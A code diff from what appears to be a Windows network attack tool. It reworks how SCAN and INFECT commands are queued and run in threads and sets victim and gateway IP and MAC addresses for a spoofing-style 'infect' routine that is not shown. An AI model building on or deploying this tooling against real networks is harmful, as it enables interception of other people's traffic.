@@ -8,56 +8,80 @@
 
 
 //globals
-static HANDLE act_threads[ACTS_NUM];
+static HANDLE running_thread;
+static BOOL acts[ACTS_NUM] = {0};
 extern send_params infect_params;
 
-void execute_command(pCommand command)
+/*
+* @purpose: set active actions.
+* @params: command (action)
+* @return void.
+*
+*/
+void add_command(pCommand command)
 {	
-	switch (command->act)
+	if (command->act == INFECT)
 	{
-	case SCAN:
-		//check if thread not active
-		if (WaitForSingleObject(act_threads[SCAN], 0) != WAIT_OBJECT_0)
-		{
-			act_threads[SCAN] = CreateThread(
-				NULL,
-				0,
-				scan,
-				(LPVOID)command,
-				0,
-				NULL
-			);
-		}
-		break;
-	case INFECT:
-		//check if thread not active
-		if (WaitForSingleObject(act_threads[INFECT], 0) != WAIT_OBJECT_0)
-		{
-			infect_params.gateway_ip = command->gateway_ip;
-			infect_params.victim_ip = command->victim_ip;
-			memcpy(infect_params.gateway_mac, command->gateway_mac, ETH_ALEN);
-			memcpy(infect_params.victim_mac, command->victim_mac, ETH_ALEN);
-
-			act_threads[INFECT] = CreateThread(
-				NULL,
-				0,
-				infect,
-				(LPVOID)command,
-				0,
-				NULL
-			);
-		}
-		break;
-	case STOP_S:
-		TerminateThread(act_threads[SCAN], 0);
-		break;
-	case STOP_I:
-		TerminateThread(act_threads[INFECT], 0);
-		break;
-	case STOP_A:
-		TerminateThread(act_threads[SCAN], 0);
-		TerminateThread(act_threads[INFECT], 0);
-		break;
+		/* set global variables for infect thread */
+		infect_params.gateway_ip = command->gateway_ip;
+		infect_params.victim_ip = command->victim_ip;
+		memcpy(infect_params.gateway_mac, command->gateway_mac, ETH_ALEN);
+		memcpy(infect_params.victim_mac, command->victim_mac, ETH_ALEN);
 	}
-	
+	/* set active */
+	acts[command->act] = 1;
+}
+
+/*
+* @purpose: execute command requests.
+* @params: lparam pointer.
+* @return 0.
+*
+*/
+DWORD WINAPI execute_commands(LPVOID lparam)
+{	
+	while (1)
+	{
+		/* iterate over scan/infect actions */
+		for (size_t act = 0; act < ACTS_NUM; act++)
+		{
+			if (acts[act])
+			{
+				/* action active request */
+				switch (act)
+				{
+				case SCAN:
+					/* create scan thread and wait for it to finish */
+					running_thread = CreateThread(
+						NULL,
+						0,
+						scan,
+						NULL,
+						0,
+						NULL
+					);
+					WaitForSingleObject(running_thread, INFINITE);
+					CloseHandle(running_thread);
+					acts[SCAN] = 0; //action not active. 
+					break;
+				case INFECT:
+
+					/* create infect thread and wait for it to finish */
+					running_thread = CreateThread(
+						NULL,
+						0,
+						infect,
+						NULL,
+						0,
+						NULL
+					);
+					WaitForSingleObject(running_thread, INFINITE);
+					CloseHandle(running_thread);
+					acts[INFECT] = 0;
+					break;
+				}
+			}
+		}
+	}
+	return 0;
 }
